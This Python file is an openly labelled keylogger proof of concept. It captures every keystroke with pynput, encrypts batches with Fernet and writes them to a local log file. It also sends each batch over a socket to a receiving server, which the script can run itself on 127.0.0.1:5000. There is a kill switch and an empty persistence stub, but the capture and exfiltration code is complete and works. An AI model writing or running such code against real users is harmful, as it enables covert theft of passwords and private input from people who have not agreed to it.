import os
import sys
import threading
import socket
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

# === Configuration ===
LOG_DIR = os.path.abspath(".")  # Store logs in current working directory
LOG_FILE = os.path.join(LOG_DIR, "keylog.enc")
KEY_FILE = os.path.join(LOG_DIR, "secret.key")
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5000
BUFFER_SIZE = 4096
KILL_SWITCH_KEY = keyboard.Key.esc  # Press ESC to stop keylogger

def create_persistence():
    # No persistence implemented for local dir PoC
    pass

def load_or_generate_key():
    if not os.path.exists(KEY_FILE):
        os.makedirs(LOG_DIR, exist_ok=True)
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as f:
            f.write(key)
        return key
    else:
        with open(KEY_FILE, 'rb') as f:
            return f.read()

def encrypt_data(fernet: Fernet, data: str) -> bytes:
    return fernet.encrypt(data.encode())

def decrypt_data(fernet: Fernet, data: bytes) -> str:
    return fernet.decrypt(data).decode()

def overwrite_log_file():
    # Clear the log file by opening it once in write mode
    with open(LOG_FILE, 'wb') as f:
        pass

def append_encrypted_log(data: bytes):
    with open(LOG_FILE, 'ab') as f:
        f.write(data + b'\n')

def send_data_to_server(data: bytes):
    try:
        with socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=5) as sock:
            sock.sendall(data + b'\n')
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")

class EncryptedKeylogger:
    def __init__(self):
        self.key = load_or_generate_key()
        self.fernet = Fernet(self.key)
        self.log_buffer = ""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.stop_event = threading.Event()

    def on_press(self, key):
        try:
            if key == KILL_SWITCH_KEY:
                print("[*] Kill switch pressed. Exiting...")
                self.stop()
                return False

            if hasattr(key, 'char') and key.char is not None:
                self.log_buffer += key.char
            else:
                self.log_buffer += f'[{key.name}]'

            if len(self.log_buffer) > 20 or '\n' in self.log_buffer:
                self.flush_logs()
        except Exception as e:
            print(f"[!] Listener error: {e}")

    def flush_logs(self):
        if not self.log_buffer:
            return
        timestamp = datetime.now().isoformat(sep=' ', timespec='seconds')
        plaintext = f"{timestamp} | {self.log_buffer}"
        encrypted = encrypt_data(self.fernet, plaintext)
        append_encrypted_log(encrypted)
        send_data_to_server(encrypted)
        self.log_buffer = ""

    def start(self):
        print("[*] Starting Encrypted Keylogger - Press ESC to exit.")
        create_persistence()
        overwrite_log_file()  # Clear old logs on start
        self.listener.start()
        try:
            while not self.stop_event.is_set():
                self.stop_event.wait(5)
                self.flush_logs()
        except KeyboardInterrupt:
            self.stop()
        self.listener.join()

    def stop(self):
        self.stop_event.set()
        self.flush_logs()
        self.listener.stop()

def run_server():
    print(f"[*] Starting localhost server on {SERVER_HOST}:{SERVER_PORT} for data exfiltration simulation")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((SERVER_HOST, SERVER_PORT))
        server_sock.listen(1)
        try:
            while True:
                client_sock, addr = server_sock.accept()
                with client_sock:
                    data = b""
                    while True:
                        chunk = client_sock.recv(BUFFER_SIZE)
                        if not chunk:
                            break
                        data += chunk
                    data = data.strip()
                    if data:
                        print("[*] Received encrypted log:")
                        print(data)
        except KeyboardInterrupt:
            print("\n[*] Server stopped.")

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Encrypted Keylogger PoC with exfiltration simulation")
    parser.add_argument('--server', action='store_true', help="Run local server to receive data")
    args = parser.parse_args()

    if args.server:
        run_server()
    else:
        keylogger = EncryptedKeylogger()
        keylogger.start()

if __name__ == "__main__":
    main()
